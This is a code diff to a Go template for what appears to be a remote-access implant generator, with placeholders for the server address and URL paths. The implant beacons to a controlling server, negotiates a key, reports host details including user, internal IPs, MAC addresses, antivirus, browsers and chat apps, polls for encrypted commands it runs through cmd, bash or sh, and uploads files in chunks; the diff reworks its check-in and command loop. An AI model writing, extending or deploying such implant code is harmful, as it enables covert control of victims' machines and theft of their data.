@@ -343,10 +343,9 @@ func send() { //发送头部信息
 	a_Mutex.RLock()
 	delay_ := delay
 	version_ := version
-	clientname_ := clientname
 	jitter_ := jitter
 	a_Mutex.RUnlock()
-	dataList := []string{clientname_, user, osname, strconv.Itoa(int(delay_)), getInternalIPs(), currentDir, version_, parts[len(parts)-1], protocol, strconv.Itoa(int(jitter_)), executable, macs, cpuInfo, Antivirus, Browsers, ChatApps, memoryStr, systemType, Arm,}
+	dataList := []string{clientname, user, osname, strconv.Itoa(int(delay_)), getInternalIPs(), currentDir, version_, parts[len(parts)-1], protocol, strconv.Itoa(int(jitter_)), executable, macs, cpuInfo, Antivirus, Browsers, ChatApps, memoryStr, systemType, Arm,}
 	encodedData, err := json.Marshal(dataList)
 	if err != nil {
 		return
@@ -365,8 +364,8 @@ func send() {
     currentDir = strings.ReplaceAll(currentDir, "\\", "/")
     parts := strings.Split(master, ":")
     executable, _ := os.Executable()
-    a_Mutex.RLock();delay_ := delay;version_:=version;clientname_:= clientname;jitter_:=jitter;a_Mutex.RUnlock()
-    dataList := []string{clientname_,user,osname,strconv.Itoa(int(delay_)),getInternalIPs(),currentDir,version_,parts[len(parts)-1],protocol,strconv.Itoa(int(jitter_)),executable,}
+    a_Mutex.RLock();delay_ := delay;version_:=version;jitter_:=jitter;a_Mutex.RUnlock()
+    dataList := []string{clientname,user,osname,strconv.Itoa(int(delay_)),getInternalIPs(),currentDir,version_,parts[len(parts)-1],protocol,strconv.Itoa(int(jitter_)),executable,}
     encodedData, err := json.Marshal(dataList)
     if err != nil {return}
     add_str := string(encodedData)
@@ -550,15 +549,15 @@ func send() {
     var(
         osname = /*os*/
         protocol = /*protocol_var*/
-        uid string
+        uid = generateUUID()
         version string
-        clientname string
+        clientname,_ = os.Hostname()
         delay int = 30
         waitTime int = 3
         jitter int = 5
         a_Mutex sync.RWMutex
         base_rounds string = "/*base_rounds*/"
-        decodeMap  = make(map[byte]int)
+        decodeMap  = buildDecodeMap()
         onece bool = true
         user string = /*Username*/
         master string = /*server*/
@@ -728,8 +727,7 @@ func send() {
             if encryptedChunk == nil {return}
             retryCount := 0
             for retryCount < maxRetry {
-                a_Mutex.RLock();clientname_ := clientname;a_Mutex.RUnlock()
-                dataList := []string{clientname_,splitSize,strconv.FormatInt(fileSize, 10),strconv.FormatInt(start, 10),strconv.FormatInt(end, 10),}
+                dataList := []string{clientname,splitSize,strconv.FormatInt(fileSize, 10),strconv.FormatInt(start, 10),strconv.FormatInt(end, 10),}
                 encodedData, err := json.Marshal(dataList)
                 if err != nil {
                     return
@@ -764,7 +762,15 @@ func send() {
             sleepdelay()
         }
     }
-    func getCmd() {
+    func run() {
+        ver := "cmd"
+        switch osname {
+        case "linux", "macos":
+            ver = "bash"
+        case "android":
+            ver = "/system/bin/sh"
+        }
+        a_Mutex.Lock();version = ver;a_Mutex.Unlock()
         url := protocol + master + "//*Path*/?/*option*/=/*MsgPath*/&/*uid*/=" + uid
         reURL := protocol + master + "//*Path*/?/*option*/=/*result*/"
         fileURL := protocol + master + "//*Path*/?/*option*/=/*list*/"
@@ -780,6 +786,11 @@ func send() {
             return args[index], true
         }
         for {
+            keyMutex.RLock();key_ := key;keyMutex.RUnlock()
+            a_Mutex.RLock();onece_:= onece;a_Mutex.RUnlock()
+            if len(key_) != 32 && onece_ {
+                run_send()
+            }
             sleepdelay()
             respBody := getUrl(url)
             if respBody == "" {
@@ -787,8 +798,8 @@ func send() {
             }
             if respBody == uid {
                 a_Mutex.Lock();onece = true;a_Mutex.Unlock()
-                run()
-                return
+                keyMutex.Lock();key = nil;keyMutex.Unlock()
+                continue
             }
             decrypted := get_decry_s(&respBody)
             if strings.TrimSpace(decrypted) == "" {
@@ -1231,12 +1242,9 @@ func send() {
             val  uint32
             valb int
         )
-        a_Mutex.RLock()
-        m := decodeMap
-        a_Mutex.RUnlock()
         out := make([]byte, 0, len(s))
         for i := 0; i < len(s); i++ {
-            v, ok := m[s[i]]
+            v, ok := decodeMap[s[i]]
             if !ok {
                 continue
             }
@@ -1257,22 +1265,27 @@ func send() {
         return m
     }
     func generateUUID() string {
-        n, err := crand.Int(crand.Reader, big.NewInt(7))
-        if err != nil {
-            return ""
+        for {
+            n, err := crand.Int(crand.Reader, big.NewInt(7))
+            if err != nil {
+                continue
+            }
+            uuid := make([]byte, 6+int(n.Int64()))
+            if _, err := io.ReadFull(crand.Reader, uuid); err != nil {
+                continue
+            }
+            if len(uuid) > 6 {
+                uuid[6] = (uuid[6] & 0x0f) | 0x40
+            }
+            if len(uuid) > 8 {
+                uuid[8] = (uuid[8] & 0x3f) | 0x80
+            }
+            uuidStr := byteSliceToHex(uuid)
+            uid := customBase64Encode([]byte(uuidStr))
+            if uid != "" {
+                return uid
+            }
         }
-        uuid := make([]byte, 6+int(n.Int64()))
-        if _, err := io.ReadFull(crand.Reader, uuid); err != nil {
-            return ""
-        }
-        if len(uuid) > 6 {
-            uuid[6] = (uuid[6] & 0x0f) | 0x40
-        }
-        if len(uuid) > 8 {
-            uuid[8] = (uuid[8] & 0x3f) | 0x80
-        }
-        uuidStr := byteSliceToHex(uuid)
-        return customBase64Encode([]byte(uuidStr))
     }
     func byteSliceToHex(bytes []byte) string {
         hexChars := "0123456789abcdef"
@@ -1338,32 +1351,18 @@ func send() {
         keyMutex.Lock();key = sharedKey;keyMutex.Unlock()
         a_Mutex.Lock();onece = false;a_Mutex.Unlock()
 	}
-    func run() {
-        a_Mutex.RLock();runonece:=onece;a_Mutex.RUnlock()
-        if runonece {
-            a_Mutex.Lock();decodeMap = buildDecodeMap();a_Mutex.Unlock()
-            if uid == "" {uid = generateUUID()}
-            host, _ := os.Hostname()
-            ver := "cmd"
-            switch osname {
-            case "linux", "macos":
-                ver = "bash"
-            case "android":
-                ver = "/system/bin/sh"
+    func run_send() {
+        client_b := customBase64Encode([]byte(clientname))
+        url := protocol + master + "//*Path*/?/*option*/=/*ConnPath*/&/*uid*/=" + uid + "&/*hostname*/=" + client_b
+        for {
+            generateAndUpdateKey(url)
+            keyMutex.RLock();key_ := key;keyMutex.RUnlock()
+            a_Mutex.RLock();onece_:=onece;a_Mutex.RUnlock()
+            if !onece_ && len(key_) == 32 {
+                send()
+                return
             }
-            a_Mutex.Lock();version = ver;clientname = host;a_Mutex.Unlock()
-            client_b := customBase64Encode([]byte(host))
-            url := protocol + master + "//*Path*/?/*option*/=/*ConnPath*/&/*uid*/=" + uid + "&/*hostname*/=" + client_b
-            for {
-                generateAndUpdateKey(url)
-                keyMutex.RLock();key_ := key;keyMutex.RUnlock()
-                a_Mutex.RLock();onece_:=onece;a_Mutex.RUnlock()
-                if !onece_ && len(key_) == 32 {
-                    send()
-                    getCmd()
-                }
-            }
-        }else{getCmd()}
+        }
     }
     `
     // 替换占位符
